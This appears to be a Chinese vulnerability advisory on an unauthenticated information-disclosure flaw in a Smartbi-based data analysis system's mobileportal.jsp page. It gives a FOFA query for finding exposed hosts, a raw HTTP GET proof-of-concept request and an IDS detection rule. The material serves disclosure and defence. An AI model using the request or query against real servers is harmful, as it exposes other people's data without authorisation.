# 广东顺德募优网络科技有限公司数据分析系统 mobileportal Apache Tomcat 存在信息泄露漏洞

广东顺德募优网络科技有限公司数据分析系统 mobileportal Apache Tomcat 存在信息泄露漏洞

# 影响版本

V9.0.0

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **app=&quot;SMARTBI&quot;**

**POC/EXP：**

**step1 信息泄露**

```
GET /vision/mobileportal.jsp. HTTP/1.1
Host: 127.0.0.1
Cookie: BBJSESSIONID=2359796CF599D2976F4A3D42235CD82E
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
Connection: Keep-alive


```

​![image](assets/image-20260910023922-lmk9oy8.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"Smartbi vision mobileportal 未授权响应确认 - Smartbi/版本/public/resid";
    flow:to_server,established;
    http.method; content:"GET"; nocase;
    http.uri; content:"/vision/mobileportal.jsp"; nocase;
    http.status; content:"200"; nocase;
    http.response_body;
        pcre:"/(Smartbi|移动门户|Mobile Portal|mobileportal)/i";
        pcre:"/(V[0-9]+\\.[0-9]+\\.[0-9]+|vision\\.min\\.js\\?v=|data-resid=|RES_[A-Z0-9_]+|当前用户\\s*[:：]\\s*public|public)/i";
    metadata:
        service http,
        affected_product "广东顺德募优网络 数据分析系统/Smartbi vision",
        vulnerability_type "Unauthenticated Information Disclosure",
        reference "Smartbi vision mobileportal advisory",
        severity "high";
    classtype:web-application-attack;
    sid:1001302;
    rev:1;
    priority:2;
)
```

# 漏洞修复

建议用户更新至最新补丁

‍
